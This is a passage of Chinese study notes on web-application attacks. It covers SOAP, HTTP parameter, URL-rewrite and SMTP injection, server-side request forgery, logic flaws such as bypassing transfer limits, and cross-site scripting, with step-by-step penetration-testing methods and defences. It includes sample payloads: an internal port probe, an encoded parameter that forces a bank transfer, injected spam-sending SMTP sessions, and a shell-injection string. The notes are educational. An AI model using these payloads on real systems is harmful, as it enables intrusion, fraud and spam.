“&lt;!–”，然后在另外一个参数中注入 “–&gt;“，看是否能够将 SOAP 消息的某个部分注释掉，从而破坏应用程序的逻辑，此时有可能造成非预期内的处理结果； SOAP 注入漏洞要能够利用成功，前提条件是知道整个 XML 的结构，这样才有办法设计专门的注入值，以便能够改变解析的结果；如果返回的错误消息不能提供这方面的信息的话，则漏洞就会很难发现；幸运的话，有可能返回的错误消息中会包含整个解析的结果，从而泄露了结构；运气不好的话，则攻击率会变得很低； 防止 SOAP 注入防止 SOAP 注入的办法是对用户的输入进行边界确认，不仅包含确认用户的当前输入，还包括用户前面步骤的输入，或者应用程序基于用户输入在过程中产生的数据； 为了防止攻击，应用程序应对用户输入中出现的任何 XML 元字符进行 HTML 编码，用 HTML 编码替代用户输入中的字面值；这样做的目的是让 XML 解析器不会将用户输入中的 XML 元字符当作有意义的语义的组成部分；几个会造成注入漏洞的 XML 元字符为： 左尖括号 &lt;，应编码为 &amp;1t 右尖括号 &gt;，应编码为 &amp;gt 斜杠 &#x2F;，应编码为 &amp;#47 注入后端 HTTP 请求应用程序经常会将用户输入弄成键值对的形式，嵌入到后端发起的 HTTP 请求中，因此攻击者可以利用这方面的漏洞将应用程序做为代理器，来访问一些本来没有权限访问的资源，例如： 服务器端 HTTP 重定向：攻击者通过注入参数到后端发起的请求中，指定应用程序请求任意的资源或 URL； HTTP 参数注入（HPI）：攻击者通过注入参数，覆盖应用程序发出的请求的指令，改变其行为逻辑和结果； 服务器端 HTTP 重定向应用程序向客户端提供的功能有时并不是由应用程序本身来完成的，而是后端有部署其他组件来提供相应的功能，因此应用程序经常需要将用户的输入，转换成相应的参数，向后端组件发起相应的请求； 示例：以下由客户端发出的请求中，loc 参数指定了要获取的 CSS 文件的地址 1view=default&amp;loc=online.wahh-blogs.net/css/wahh.css 攻击者可以通过替换 loc 参数的值，来让应用程序向其指定的地址发起资源请求，如果应用程序没有对此进行确认和过滤，则攻击者可以将地址设置为后端服务器可以访问的任意资源； 示例：攻击者将地址替换为后端的 SSH 服务 12345678# 请求，loc 参数值被替换view=default&amp;loc=192.168.0.1:22# 响应，包括了 SSH 服务的信息HTTP/1.1 200 OKConnection: closeSSH-2.0-OpenSSH_4.2Protocol mismatch. 攻击者可以利用该漏洞，让应用程序成为一个开放的代理服务器，来实施各种其他攻击 攻击者可以将该代理服务器用于攻击互联网上的第三方系统； 攻击者可以通过该服务器连接到组织内部网络中的任意主机，从而访问无法通过因特网直接访问的资源或服务； 攻击者可以利用该服务器反向连接到应用程序服务器上的其他服务，从而避开防火墙限制，并利用信任关系来避开身份验证； 攻击者可以让应用程序在响应中包括受控的内容，从而实施跨站点脚本等攻击； 渗透测试步骤 确定任何可能包含主机名、IP 地址或完整 URL 的请求参数； 对于每个参数，修改参数值，指向其他与所请求的资源类似的资源，观察该资源是否会出现在服务器的响应中； 尝试指定一个受控的 URL，然后监控在请求发出后，该 URL 是否被访问； 如果 URL 没有被连接，则观察请求的响应时间，如果时间很久，则有可能是因为某种访问规则的限制，导致应用程序的请求发不出去，导致超时； 如果能够成功发现漏洞，连接到任意的 URL，则可以尝试实施以下攻击： 确认是否可以指定端口号，例如：http://mdattacker.net:22 如果可以指定端口号，尝试使用类似 Burp Intruder 等工具对内部网络的端口进行扫描，以逐个连接到一系列 IP 地址和端口； 尝试连接到应用程序服务器回环地址上的其他服务； 尝试将受控的 Web 页面加载到应用程序的响应中，以实现跨站点脚本攻击； 有些服务器程序的重定向 API，例如 ASP.NET 中的 Server.Transfer 和 Server.Excecute，仅可重定向到同一主机上的相关URL，尽管如此，攻击者仍然可以利用信任关系，访问服务器上原本受保护的敏感资源； HTTP 参数注入示例： 123456# 客户端发起的 HTTP 请求POST /bank/48/Default.aspx HTTP/1.0Host: mdsec.netContent-Length: 65FromAccount=123&amp;Amount=1000&amp;ToAccount=456&amp;Summit=Submit 12345# 应用程序基于客户端的输入，生成新的后端 HTTP 请求POST /doTransfer.asp HTTP/1.0Host: mdsec-mgr.ini.mdsec.netContent-Lenght: 44fromacc=123&amp;Amount=1000&amp;toacc=456&amp;clearedfunds=false 由于应用程序检查后，发现账户上的余额不足，因此在发起的请求中添加了 clearedfunds&#x3D;false 键值对来避免触发实际的转账，因此，攻击有可能伪造参数来触发转账 123# 客户端发起的 HTTP 修改为# 此处故意将请求参数中的等号 = 用 %3d 来表示，连接符 &amp; 用 %26 表示，以利用应用程序将其解码为正确的符号）: FromAccount=123&amp;Amount=1000&amp;ToAccount=456%26clearedfunds%3dtrue&amp;Summit=Submit 如果应用程序没有将用户的请求进行过滤，则其向其他组件发起的请求将变成如下： 12# 应用程序未过滤用户输入时发起的请求变成如下：fromacc=123&amp;Amount=1000&amp;toacc=456&amp;clearedfunds=true 使用 HTTP 参数注入与 SOAP 注入的一个区别是，如果参数格式不对，SOAP 因为使用了 XML，会报错，从而为攻击者提供有用的反馈信息；但 HTTP 参数如果出现错误，一般不会报错，因此这会带来攻击上的困难，攻击者很难通过随机的方式猜测到参数是什么，但是如果应用程序使用的第三方组件的代码可以被查到，则攻击者可以通过查看这些代码的文档，找到其参数格式信息； HTTP 参数污染如果客户端发起的请求中，包括多个同名的键值对，HTTP 报文解析器会如何处理？不同的解析器会有不同的处理方式，常见的有以下几种： 使用第一个键值对实例； 使用最后一个实例； 将同名键值对组成数组； 不处理，串联多个参数值，添加某种分隔符； 如果应用程序使用最后一个或者第一个同名实例，都有可能让攻击者攻击成功； 攻击 URL 重写转换许多服务器程序会将受到的客户端请求的 URL 路径部分进行重写，例如处理 REST 风格的参数，定制路由函数等；如果在重写的过程中，没有进行过滤检查，则攻击者可以利用访漏洞，进行参数污染； 示例：开发者在 Apache 中配置 mod_rewrite 规则用于处理可公共访问的用户资源 12RewriteCond %&#123;THE_REQUEST&#125; ^[A-Z]&#123;3, 9&#125;\\ /pub/user/[^\\&amp;]*\\TP/RewriteRule ^pub/user/([^/\\.] +)$ /inc/user_mgr.php?mode=view&amp;name=$1 该规则提取用户请求中的文件名，做为值，与 name 字段组成参数，传递给 user_mgr.php 页面进行处理 12345# 例如接受如下请求/pub/user/marcus# 之后转换为/inc/user_mgr.php?mode=view&amp;name=marcus 攻击者可在原始请求中注入另外 mode 来改变应用程序的行为 12345# 攻击者注入额外的参数值/pub/user/marcus%26mode%30edit# Apache 服务器转换后/inc/user_mgr.php?mode=view&amp;name=marcus&amp;mode=edit 渗透测试步骤 轮流对每个请求参数进行测试，使用各种语法添加一个新注入的参数 %26foo%3dbar，URL 编码的 &amp;foo&#x3D;bar %3bfoo%3dbar，URL 编码的 ;foo&#x3D;bar %2526foo%253dbar，双重 URL 编码的 &amp;foo&#x3D;bar（将 % 百分比也做了一重编码） 确定任何修改后，不会改变应用程序行为的参数实例； 尝试在请求的不同位置注入一个已知的参数，看这样做是否会覆盖或修改现有的参数； 如果这样做会将旧值替换成新值，尝试是否可以通过注入一个由后端服务器读取的值，来避开任何前面确认机制； 用其他参数名称替换注入的已知参数（可通过解析应用程序的功能进行猜测和寻找线索）； 测试应用程序是否允许在请求中多次提交同一个参数，在参数的前后，以及请求的不同位置提交多余的值，例如查询字符串、cookie 和消息主体中； 注入电子邮件有些应用程序提供收集用户反馈的功能，例如关于产品的建议或者BUG，有些时候这类功能在后端使用电子邮件的形式来实现。即用户提交的输入，到了后端会发送给 SMTP 服务器，然后按照某种设定好的模板，发送给相关的人员；如果应用程序没有对用户的输入进行仔细净化的话，攻击者就有机会在提交的内容中，注入一些 SMTP 命令，从而控制 SMTP 服务器，实现一些非法行为，例如让 SMTP 服务器帮助攻击者发送垃圾邮件等； 操纵电子邮件头部 应用程序允许用户提交反馈的界面，用户可以在该界面中输入自己的邮件地址；之后，Web应用程序如 PHP 将调用 mail 函数，生成电子邮件，例如： 12345To: admin@wahh-app.comFrom: marcus@wahh-mail.comSubject: Site problemxxxxxxxxx 如果应用程序的后端没有对用户输入的地址进行过滤，则攻击者可以在地址中注入有效的 SMTP 命令字符串，让 SMTP 将服务发送给其指定的任意收件人 PHP mail 命令将生成如下内容 123456To: admin@wahh-app.comFrom: marcus@wahh-mail.comBcc: all@wahh-othercompany.comSubject: Site problemxxxxxxxxx SMTP 命令注入某些情况下，Web 应用程序会与 SMTP 服务器建立会话，传输数据内容； 用户端发起的请求，提交关于站点的反馈 12345POST feedback.php HTTP/1.1Host: wahh-app.comContent-Length: 56From=daf@wahh-mail.com&amp;Subject=Site+feedback&amp;Message=foo Web 应用程序与 SMTP 服务器建立的会话往来示例： 12345678MAIL FROM: daf@wahh-mail.comRCPT TO: feedback@wahh-app.comDATA # 此处 SMTP 客户端发出 DATA 命令，应用程序接下来将开始发送消息的内容，包括消息头和消息体，并以点号表示结束From: daf@wahh-mail.comTo: feedback@wahh-app.comSubject: Site feedbackfoo. # 用单独一行的点等号表示消息的结束 如果应用程序没有对用户输入进行过滤的话，则攻击者可以利用这个漏洞，在消息中注入有效的 SMTP 命令，从而实现对 SMTP 服务器的控制；注入示例如下（在 subject 字段进行注入）： 之后 Web 应用程序建立如下 SMTP 会话，生成了两个电子邮件，其中第二段由攻击者完全控制： 123456789101112131415161718MAIL FROM: daf@wahh-mail.comRCPT TO: feedback@wahh-app.comDATA From: daf@wahh-mail.comTo: feedback@wahh-app.comSubject: Site feedbackfoo.MAIL FROM: mail@wahh-viagra.comRCPT TO: john@wahh-mail.comDATAFrom: mail@wahh-viagra.comTo: john@wahh-mail.comSubject: Cheap V1AGR4Blah.foo. 查找 SMTP 漏洞在解析应用程序的功能时，留意其中那些与电子邮件相关的功能，测试这些功能涉及的每一个参数，甚至那些可能与生成的消息无关的参数； 除了每一种攻击方式外，还注意各使用 Windows 和 Unix 的换行符来测试一遍，因为有时候并不知道后台使用的是哪一种操作系统； 渗透测试步骤 轮流提交以下的测试字符串作为每一个参数，用于在相关位置插入电子邮件地址； 留意应用程序返回的错误消息，根据错误消息，看是否跟电子邮件功能相关，如果是的话，考虑对提交的注入内容进行相应的调整，以利用漏洞； 监控受控的邮箱，看是否收到邮件； 仔细检查发出的 HTTP 请求，看是否存在与后端的电子邮件相关的线索，例如是否包含隐藏或禁用字段，用于指定电子邮件收件人等； 发送电子邮件功能经常被视为外围功能，而非核心功能，因此经常没有被重视，并采取足够的安全保障；电子邮件有时需要调用一些不常用的第三方组件，应用程序经常直接调用操作系统的命令来执行它们，因此还经常隐藏着 OS 命令的注入漏洞，应对其进行仔细的检查； 防止 SMTP 注入防止 SMTP 注入的办法用户提交的任何数据进行严格的检查 根据一个适当的正则表达式检查电子邮件地址，例如拒绝所有的换行符； 消息主题不得包含任何的换行符，并应实施适当的长度限制； 如果消息内容会被 SMTP 会话直接使用，则应在消息内容中禁止使用只有一个点字符的消息行； 小结一般来说，实施有效攻击的关键在于从直觉上了解漏洞的位置，以及如何对其加以利用；获得这种直觉的方式在于实践，在现实的应用程序中，演练前面提到的各种攻击技巧，并观察应用程序如何对攻击作出反应，从而建立对应用程序行为与漏洞有关联的直觉。 11. 攻击应用程序逻辑计算机不外乎做两种计算，一种是逻辑计算，一种是算术计算；所有复杂的应用程序功能，最后都将拆解成由简单的逻辑和算术计算来构成；人们常常只关注那些常见的漏洞，例如 SQL 注入或者跨站点脚本，却往往忽略了程序中的逻辑漏洞其实它们无处不在，尤其是当应用程序是由多名水平参差不齐的开发者来共同完成的时候；这些漏洞经常是与应用程序功能紧密相关和唯一的，它们很隐蔽，无法被常规的漏洞扫描器所发现； 逻辑缺陷的本质逻辑缺陷本质上来源于开发者的设计缺陷，由于开发者在设计过程，做出某种错误的假设，导致应用程序在某些条件下，将出现预期外的行为；只要开发者的水平没有显著提高，这些漏洞缺陷将是不可避免和大量存在的。 现实中的逻辑缺陷例子1：加密算法提示漏洞有些应用程序为了减少用户登录的次数，会将用户信息加密成一个长久有效的 cookie 值，存储在浏览器中；正常情况下，攻击者是无法破解该加密后的 cookie 值的，但是有些开发者还会将该加密算法应用于其他 cookie 字段，例如屏幕上显示的用户昵称；但好死不死的是，用户昵称是可以由用户自己指定的；因此，攻击者通过指定不同的用户昵称，就可以得到加密后的值；此时，攻击者可以将自己浏览器上加密后的 cookie 值做为昵称，经过加密算法解密后，得出原始值的格式；然后再按照相同的格式，尝试将其中的用户名替换为管理员的用户名，然后设置为昵称，这样就可以得到加密后的新 cookie 值；使用该 cookie 值，很可能就可以实现管理员登录； 渗透测试步骤漏洞场景：使用令牌的程序 在应用程序中找出使用加密值的位置（大多数情况下是使用散列值）； 查找应用程序中，任何对用户提交的值进行加密或者解密的位置； 如发现应用程序使用某个加密值，尝试替代该加密值，然后观察程序是否会提示替代后的结果或报错； 如有结果或报销，尝试利用该信息； 查找应用程序中，当用户提交加密值，程序会在响应中显示对应的解密值的位置 如有，说明提示漏洞存在； 确认这种漏洞是否会导致敏感令牌泄露； 查找应用程序中，当用户提交明文值，程序会在响应中显示对应的加密值的位置； 如有，说明提示漏洞可能存在； 尝试对该漏洞加以利用，例如通过指定任意值，让程序进行处理，得到有用的信息； 例子2：密码修改漏洞有些程序为用户提供修改密码的功能，该功能要求客户端提交用户名、现有密码、新密码等字段组成；同时，该功能同时也面向管理员，即管理员也可以使用该功能修改自己的密码；两种角色的区别在于管理员不需要提供现有密码，后端的代码通过判断是否包含现有密码，来区别修改密码的用户是否为管理员角色； 这个漏洞的脑洞太大了，简直是致命的；攻击者可以利用该漏洞获得管理员的权限，并修改任意用户的现有密码； 渗透测试步骤 在探查逻辑缺陷时，尝试轮流删除关键功能的请求中提交的每一个参数，例如 cookie、查询字符串、POST 参数等； 删除参数名称的时候，同时也删除参数值，而不是将参数值设置为空字符串； 一次仅攻击一个参数，确保可以覆盖后端代码逻辑中的每一个分支； 如果该功能属于多阶段过程，务必要完成整个过程，因为很可能后面步骤会使用前面步骤中提交的并保存在会话中的数据； 例子3：步骤控制漏洞在多步骤的功能中，很多开发者想当然的认为用户一定会按照界面上显示的内容，依次完成每一个环节，但事实上攻击者并不会这么做；攻击者会以任意顺序提交请求，从而绕过一些中间步骤，达到最终结果； 渗透测试步骤 如果某个多阶段功能需要按预定顺序提交一系列请求，尝试按其他顺序提交请求； 尝试完全忽略某些中间阶段； 多次访问同一个阶段； 推后访问前一个阶段； 了解多阶段功能的阶段控制办法； 例如多阶段功能的不同阶段的请求，可能都是访问的同一个 URL，并在参数中指定阶段序号参数或者阶段名称； 猜测开发者做出的错误假设，判断主要受攻击面的点； 设法找出如何违反这些假设的方法，从而让程序出现反常行为； 在不按顺序访问程序时，如果程序出现异常行为，例如某个变量值和状态值异常；则此时很可能存在可以利用的有用错误信息，可用来进一步推断程序的内部机制，以便对攻击方法进行优化； 例子4：额外字段漏洞开发者经常假设用户只会提交页面表单所指定的字段，但事实上攻击者可以提交额外的字段，来影响程序的行为； 因此，绝对不能读取客户端提交的整个请求对象，而是按需读取；如果需要读取很多字段，可以编写一个函数进行净化处理，返回一个按需读取后生成的新对象； 在多阶段的功能中，开发者经常在后面阶段中假设其收到的值，已经在前面的阶段中经过了严格的检查，但事实上，由于攻击可以直接访问任意一个阶段，这将导致后面阶段收到的值，其实是攻击者自行定义好的，根本没有经过前面阶段的代码的任何检查； 渗透测试步骤 如果存在多阶段的功能，则应提取某个阶段提交的参数，然后尝试在另外一阶段提交该参数； 如果程序的状态随参数的变化出现更新，则应进一步探索这种漏洞的衍生效果，看是否可以利用它来实施恶意的操作； 某个功能可能使用不同的参数来区分用户，来产生不同的行为；观察不同角色的用户，就同一项功能，是否在提交的参数上有什么不同； 如果有，就尝试以 B 用户的身份提交 A 用户的独有参数，观察该请求的衍生效果，猜测是否存在可利用的漏洞； 例子5：会话身份漏洞开发者经常将用户信息保存在会话中，如果程序中存在某个功能（例如注册），允许更改会话中用户的的核心信息，则有可能存在伪造身份的漏洞，即攻击者先注册一个有效的会话，然后利用该功能，更改其会话中的身份信息，并跳转到程序中的其他页面，此时很可能能够扮演其他身份的用户； 渗透测试步骤 如果应用程序存在水平权限或垂直权限隔离，则设法确定会话中存储了哪些与用户身份相关的信息； 浏览某个功能区域，然后转换到另一个完全无关的区域，检查积聚的状态，是否会对应用程序的行为造成影响； 例子6：交易限额漏洞假设某个程序有权在两个受控的账户之间进行转账（例如银行账户），并设置转账限额，超过限额后需要审批；限额判断的代码容易犯一个错误，即忘记处理输入值为负数的情况，此时有可能导致反向转账成功； 渗透测试步骤规避交易限制的第一步，是先确认当前的输入控制接受哪些字符，不接受哪些字符 试着输入负值，观察程序是否能够正常处理； 如果能够正常处理，此时有可能需要为利用漏洞创造条件，例如确保转出账户上有足够的金额；（想起了虚拟平台被攻击的案例）； 例子7：折扣计算漏洞很多电商程序会提供折扣计算功能，即购物金额超过一定金额时，消费者能够享受到更大的折扣；开发者有时会忘记处理逆向场景，即当消费者将商品从购物车移走时，需要重新计算折扣，导致消费者可以利用这个漏洞，先添加在大量商品，触发折扣条件，然后再移除不需要的商品； 渗透测试步骤 检查应用程序中，是否存在价格或其他敏感价值的东西，需要根据用户输入的数据进行调整的情况； 如果有，了解程序使用的算法和调整的逻辑； 检查这些调整是一次性的行为，还是非一次性行为； 发挥想象力，想出一种操纵办法，让调整行为与开发者的预设相矛盾； 例子8：转义符漏洞为了避免注入漏洞，开发者会对敏感字符进行限制，但是开发者经常只控制一层（没有递归），导致攻击者可能会使用两层甚至多层转义的办法，来绕过开发者的限制； 例如：开发者会设置敏感字符列表，然后对列表中的字符添加转义符；当用户提交 foo;ls 时，开发者会对其中的敏感字符分号添加转义符，最终变成 foo;ls 但是，攻击者会尝试提交 foo;ls，这样一来，按照开发者的处理逻辑，最终字符串变成了 “foo\\;ls”，转义符本身被转义，shelll 可以接受以上命令并执行，攻击者的注入意图得以实现； 渗透测试步骤在探查程序是否存在注入缺陷时，尝试在受控制的数据中，插入相关元字符后，再在每个元字符前插入一个反斜线，对元字符符进行转义，观察程序程序的反应； 一些处理跨站点脚本攻击的代码中，也经常使用转义符来净化用户提交的数据，但是它们经常忘了对转义符本身进行处理； 例子9：过滤截短漏洞开发者在防范 SQL 注入漏洞时，会使用过滤和长度限制两种方法；一种常见的过滤方法是对引号进行配对，这样就可以避免攻击者使用引号；在做长度限制时，有些开发者不是直接报错，而是对输入进行截短；攻击者此时可以巧妙的利用截短功能，来使用引号配对功能失效，从而能够实施注入攻击； 一开始并不需要知道开发者实施的长度限制是多少，攻击者只需要轮流提交奇数个和偶数个由引号组成的长字符串，并观察程序是否报错，即可确认长度限制为多少； 渗透测试步骤记下应用程序中修改用户输入的所有位置（例如截短、删除数据、编码、解码等）；对于观察到每一个位置，检查是否可以人为构造恶意字符串； 如果输入数据已经被过滤了一次（非递归），确认是否可以提交一个“补偿”过滤的字符串；例如：假设程序会过滤着关键字 SELECT，则尝试提交 SELECTSELECT，看程序是否会在过滤后，留下一个 SELECT； 如果程序中存在多步骤的行为，则可以检查是否可以利用后面的步骤，来破坏上一个步骤的过滤结果； 例子10：搜索功能漏洞有些应用程序提供全局搜索功能，即搜索所有文档，但有时这些文档只是部分公开，攻击者可以利用搜索功能，反复提交各种关键字组合，从而推断出文档的内容，获取一些敏感数据； 例子11：调试信息漏洞当一个新产品上线时，前期不可避免会存在大量功能上的缺陷，开发者为了方便调试，经常会让程序返回一些与错误相关的数据，有时候这些数据是很敏感的，例如用户的令牌、用户名、请求参数等；开发者有时会将这些数据保存在某个全局变量，然后使用某个 URL 指向它，然后通过重定向返回错误提示数据； 如果访问错误提示数据的 URL 是固定的或者可以预测的，那些攻击者可以通过反复访问该 URL，来获取一段时间内所有的错误提示，从而获取到一大堆用户敏感数据，甚至当管理员访问出错时，就可以直接得到管理员的敏感数据，从而攻陷整个程序； 渗透测试步骤 先罗列出程序中所有可能出现的反常事件和条件（以便创造条件触发它们），以及使用非常规的方式返回有用的用户令牌的情况（例如返回调试信息）； 同时使用两名用户的账户登录并使用应用程序，使用一名用户系统性的触发每个条件，观察另外一个用户是否会受到影响； 例子12：全局变量漏洞经验不足的开发者有时会将某个用户信息保存在全局变量中，以供另外一个位置的函数能否进行访问；当用户数量足够多时，有可能同时有两名用户触发保存该变量的条件，此时会形成竞态条件，从而使得一名用户有机会访问另外一名用户的信息； 渗透测试步骤这种漏洞很难发现，因为它需要比较极端的条件，同时错误不容易复现 针对关键功能进行测试，例如登录机制，密码修改功能、转账功能等； 该关键功能要求用户提交一个或多个请求； 找出确认用户请求提交成功的判断方法，即用户请求的数据，能够被查看核对； 使用多台机器，从不同的网络位置发起请求，反复执行请求操作，检查每项操作是否达到预期的结果； 由于程序将面临高负载访问，做好接收错误警报的准备； 避免逻辑缺陷由于逻辑缺陷是由于开发者在功能设计中考虑不周造成的，因此它出现的形式多种多样，并没有什么统一的规律；但仍然存在一些最佳实践能够尽量减少漏洞出现的概率； 确保将应用程序的设计信息尽量清楚详细的记录在文档中，以方便其他人了解设计者在设计过程中做出的相关假设，从而不同人可以站在不同的视角，来判断其他假设是否隐藏潜在的漏洞； 要求所有的源代码提供清楚的注释，包括： 每个代码组件的用途和使用方法； 每个组件对其接收的内容的假设； 进行代码的安全审查时，思考开发者的假设，是否任何被违背的可能性，尤其是当输入是能否被用户完全控制的时候； 进行代码的安全审查时，思考两个问题：程序如何处理用户的异常行为和输入；功能依赖的不同组件之间是否可能造成相互影响； 铭记以下内容： 用户可以控制请求的所有内容； 仅根据会话确定用户的身份与权限；不根据请求中的内容对用户的权限做出任何假设； 当根据用户的请求，对会话数据进行操作时，考虑可能给程序功能造成什么影响；很多时候影响是跨开发者的，即影响了其他程序员开发的功能； 如果某个搜索功能能否访问用户本应无法访问的敏感信息，则应该确保用户无法使用该功能，或者无法根据搜索结果提取有用的信息，或者根据当前用户的信息执行动态的搜索； 在双重授权模型中，考虑一个高级权限用户，创建另外一个相同权限用户的可能影响； 小结探查逻辑缺陷的关键点，在于洞查开发者的思维方式，他们会如何完成某个功能，会走哪些捷径，会做出哪种错误的假设，通常会犯下什么错误、当开发时间紧张时会漏考虑什么问题等； 12. 攻击其他用户XSS 的分类反射型 XSS 漏洞提取用户提交的输入，并将其插入到服务器响应的 HTML 代码中，是 XSS 漏洞的一个明显特征；一个常见的场景是开发者通常会写好一些模板，然后提取用户的输入，插入到模板中的指定位置，生成最终发给浏览器的 HTML 文件；此时，如果攻击者在输入中混入 js 代码，则服务器发回的 HTML 文件，将会触发 js 代码的执行； 这个漏洞能否利用成功的关键点在于，攻击者要诱使用户访问一个由攻击者提供的链接，这个链接将指向攻击者想要攻击的网站，而不是攻击者自己的网站；之后，由于浏览器的同源策略，当用户对某个网站发起请求时，浏览器会执行该网站返回的脚本，并允许其访问网站域名对应的浏览器端数据（例如 cookie）；由于脚本是由攻击者设计并插入的，是一段恶意的脚本；该脚本获得目标网站的敏感数据后，再将数据发至攻击者自己的服务器； 保存型 XSS 漏洞A 用户提交的数据，未经过滤或者净化即显示给 B 用户，则可能产生此类漏洞；例如应用程序有运行终端用户进行交互的功能，或者具有管理权限的员工访问普通用户提交的数据的功能； 严格意义来说，保存型漏洞算不上跨站点的XSS 类型了，因为在整个过程中并没有涉及第二个站点，都一直是在同一个站点中； 基于 DOM 的 XSS 漏洞反射型 XSS 的原理是由服务端将恶意代码插入到 HTML 标签中，被客户端浏览器加载后，即可被执行；DOM 型 XSS 是将恶意代码放在参数中，由应用程序 HTML 页面的正常 JS 脚本去提取它，然后触发被执行（感觉有点类似于一个二阶的反射型 XSS）； 进行中的 XSS 攻击真实 XSS 攻击案例一：Apache 问题反馈Apache 基金会官网有一个问题追踪的功能存在反射型 XSS 漏洞，攻击者利用该功能发布了一个恶意链接，诱使其他用户点击；当管理员点击时，他的会话将会发给攻击者；攻击者利用管理员的身份登录后，获得应用程序的管理员权限；然后修改了某个项目默认上传文件夹的位置，将其更改为 Web 根目录中的可执行目录；之后，攻击者向该目录上传了一个木马登录表单，从而获取特权用户的用户名和密码；由于很多用户经常在不同系统中使用相同的密码，攻击者进一步扩大了其攻击范围，延伸到了当前 Web 应用程序之外； 案例二：MySpace 个人资料MySpace 社交网站的用户资料页存在保存型的 XSS 漏洞，虽然其对用户的输入进行了过滤，但是不彻底；攻击者在自己的个人资料介绍页中插入脚本，当其他用户尝试看他的资料时，就会触发脚本的执行；该脚本会触发浏览器执行一系列的操作，包括将攻击者添加为用户的好友，并将脚本进一步插入到用户的个人资料页中，这样当用户的好友查看当前用户资料页，脚本就会呈指数级的进一步扩散；短短几个小时，就有一百多万人将攻击者添加为好友； 案例三：电子邮件电子邮件允许内容为 HTML 格式，同时很多电子邮件程序提供网页版，因此攻击者可以向其他用户发送带有恶意脚本的电子邮件；当邮件在浏览器端被打开时，脚本即可以被浏览器触发执行；（电子邮件是保存型 XSS 漏洞的天然场所）； 案例四：TwitterTwitter 网站曾经成为保存型和 DOM 型漏洞的受害者，原因在于 Twitter 在其客户端大量使用类似 Ajax 的代码，从而使得脚本有机会被触发； XSS 攻击方法传播假消息当某个公司的网站存在保存型 XSS 漏洞时，攻击者可以利用访漏洞，向目标网站注入精心设计的页面，让其看起来像真的一样；当不明真相的用户访问该网站时，会被这些以假乱真的信息所误导，甚至会触发媒体进一步报导，会引发市场恐慌，影响公司股价，之后攻击者可以从中获取利益； 注入木马功能攻击者在目标网站中注入恶意代码，诱使用户执行一些有害操作，例如输入敏感数据（例如证书），然后发送给攻击者；之后攻击者就可以使用该用户的身份登录目标网站，实现自己的利益（很多钓鱼网站的套路）； 另外一种诱使的办法是以某种非常有吸引力的条件为诱饵，要求用户输入他们的敏感信息，例如信用卡信息；由于此时的 URL 是指向真实的域名，所有用户很容易上当； 提升权限仅仅得到普通用户的会话有时并没有什么特别大的用处，因为攻击者不可能时时监控他的服务器，同时当他代表用户进行操作时，也会在应用程序中留下非用户电脑的登录记录；更好的办法是注入自动化的脚本，该脚本会尝试提升攻击者账户的权限，通常来说这会失败；但是等待一段时间，当管理员登录并触发恶意脚本时，提升权限的动作就会成功，成功相当隐蔽，不容易被察觉和发现； 自动填写的表单、本地程序、ActiveX控件XSS 能够是建立在浏览器默认会信用由当前网站提供的脚本，然后执行它；事实上，还存在着其他一些信任关系可以利用，包括： 有些应用程序提供自动完成表单的功能，当该功能被激活后，恶意脚本可以先实例化一个虚拟的表单，触发浏览器会将缓存信息自动填写到表单中，然后恶意脚本就可以访问表单中的内容，发送给攻击者； 一些 Web 应用程序会要求用户将其域名添加到可信站点，这个操作其实是变相提高了 Web 程序在用户本地电脑的权限；当 Web 程序存在 XSS 漏洞时，攻击者就可以利用该漏洞和已经提升后的权限，在用户的电脑上执行更高权限的操作，例如启动某个本地程序； 一些 Web 应用程序为加强客户端的功能，可能提供具备强大方法的 ActiveX 控件，当漏洞被攻击者发现和利用后，攻击者可以进一步利用控件中的方法，来完成恶意操作； XSS 漏洞不仅仅会影响因特网上的 Web 应用程序，同时也会影响内网中的应用程序，例如保存型脚本可以利用邮件在同事之间传播，并利用内网服务器经常信任其域内计算机的特点，攻击内网中的应用程序； XSS 攻击的传送机制传送反射型与基于 DOM 的 XSS 攻击发邮件或即时消息 当攻击者利用漏洞设计好攻击脚本后，他可以有针对性的发给特定用户，例如管理员，假装抱怨网站的某个功能不可用，诱使管理员打开邮件，触发恶意脚本的执行；许多应用程序还提供“推荐给朋友”或者“提交反馈”的功能，这种功能经常会生成一封电子邮件，有时内容和收件人可由用户自定义；攻击者可以邮件内容中插入恶意脚本，当收件人当开时，触发脚本的执行；尤其是被管理员打开时最有用； 在即时消息中向目标用户提供一个包含恶意脚本或参数的 URL； 第三方网站 很多第三方网站允许用户发布 HTML 内容，例如论坛；攻击者可以利用该功能，在第三方网站上发布某个携带恶意 URL 的内容，诱使其他用户点击；该 URL 实际指向的是攻击者服务器的一段恶意脚本，当用户在不知情的情况下点击该 URL，浏览器将会请求恶意脚本到用户的电脑上，并触发脚本的执行； 攻击者可以付费发布广告，然后在广告中包含某个指向漏洞网站的 URL，诱使用户点击，触发脚本执行；很多公司会付费进行推广，同时设计相关的广告；攻击者可以设计一个类似的广告，让它看起来像真的一样，并付费让其混杂在该公司的实际广告中，这种做法非常以假乱真，用户有很大概率会点击；该做法相当于攻击者付费买进了大量的用户会话； 自建站点 攻击者可以自建站点，包含一些有吸引力的内容，同时也包含一些恶意脚本，触发用户向易受攻击的应用程序提出包含 XSS 的语法；如果用户刚好登录了易受攻击的应用程序，并且碰巧浏览了攻击者的站点，攻击者就有机会获得用户的会话； 攻击者可以在自建站点上模拟搜索引擎的功能，当用户提交搜索的关键字后，攻击者向用户展示搜索结果，诱使用户点击看上去最相关的内容，但实际上内容的链接指向的是某个易受攻击的网站； 传送保存型 XSS 攻击带内传送攻击者控制的数据，通过应用程序本身的 Web 界面提交给应用程序，并最终在 Web 界面上呈现，常见显示位置包括： 个人信息字段：例如姓名、电子邮件、地址、电话等； 文档、上传文件和其他数据的名称； 提交给管理员的反馈或问题； 向其他应用程序用户传送的消息、注释、问题等； 记录在应用程序日志中，管理员通过浏览器进行查看的内容，例如 URL, 用户名, HTTP Referer, User-Agent 等； 在用户之间共享的上传文件内容等； 带外传送在应用程序之外的界面上显示控制数据，例如通过电子邮件发送恶意链接，诱使受害者进行点击；链接最终在受害者的邮件页面上显示，而不是受攻击的应用程序界面上显示； 漏洞复合攻击有时候单个漏洞可能属于风险极低的漏洞，虽然漏洞存在，但对于攻击者来说可能并没有利用的价值；但是当多个低风险的漏洞同时存在，并可以整合利用时，有可能会变成一个大漏洞； 例1：昵称只有本人可见的功能，是一个小漏洞，但同时用户有权限修改其他用户的昵称，则它将变成一个巨大的漏洞； 例2：应用程序中包含保存型 XSS 漏洞，同时仅向用户显示的个人数据存在跨站请求伪造的漏洞，二者结合将变成一个巨大的漏洞； 查找并利用 XSS 